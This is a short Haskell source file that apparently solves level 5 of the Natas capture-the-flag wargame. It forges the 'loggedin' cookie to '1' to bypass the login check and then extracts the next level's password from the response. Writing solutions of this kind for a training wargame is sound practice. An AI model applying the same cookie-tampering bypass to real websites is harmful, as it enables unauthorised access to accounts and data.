{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas5 where

import           Safe         (lastMay)

import           Network.Wreq (cookie, cookieValue, cookies, responseCookieJar)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  req <- accessLevel 5
  let modifyCookie = (cookie "loggedin" . cookieValue) .~ "1"
      placeJar = cookies ?~ (req ^. responseCookieJar)
  ckireq <- accessLevel' 5 (parentUri 5) (modifyCookie . placeJar)
  let body = reqBody ckireq
      match = workupBody 6 body
  pure $ match >>= lastMay
